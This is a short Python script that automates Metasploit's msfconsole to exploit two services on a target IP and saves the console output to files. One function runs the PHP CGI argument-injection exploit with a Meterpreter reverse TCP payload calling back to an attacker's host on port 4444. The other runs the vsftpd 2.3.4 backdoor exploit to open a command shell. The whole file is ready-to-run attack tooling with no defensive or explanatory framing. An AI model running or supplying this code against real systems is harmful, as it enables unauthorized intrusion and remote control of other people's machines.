import os
import subprocess

# Directory to store results
RESULTS_DIR = "results/"
if not os.path.exists(RESULTS_DIR):
    os.makedirs(RESULTS_DIR)

def run_metasploit_command(msf_command, results_file):
    """
    Runs a Metasploit command using `msfconsole` in non-interactive mode.
    Saves results to a file.
    """
    print(f"[+] Running Metasploit command:\n{msf_command}")
    process = subprocess.Popen(
        ["msfconsole", "-q", "-x", msf_command],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    # Reading output in real-time and logging to file
    with open(results_file, "a") as f:
        while True:
            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break
            print(line, end="")  # Show live output
            f.write(line)
    process.wait()
    print(f"[+] Results saved to {results_file}")

def exploit_php_cgi(target_ip, local_ip, results_file):
    """
    Exploits PHP CGI vulnerability and starts a Meterpreter session.
    """
    msf_command = (
        f"use exploit/multi/http/php_cgi_arg_injection; "
        f"set RHOST {target_ip}; set PAYLOAD php/meterpreter/reverse_tcp; "
        f"set LHOST {local_ip}; set LPORT 4444; run"
    )
    run_metasploit_command(msf_command, results_file)

def exploit_vsftpd(target_ip, local_ip, results_file):
    """
    Exploits vsftpd vulnerability and starts a command shell session.
    """
    msf_command = (
        f"use exploit/unix/ftp/vsftpd_234_backdoor; "
        f"set RHOST {target_ip}; set PAYLOAD cmd/unix/interact; "
        f"set CHOST {local_ip}; set CPORT 4444; set RPORT 21; run"
    )
    run_metasploit_command(msf_command, results_file)

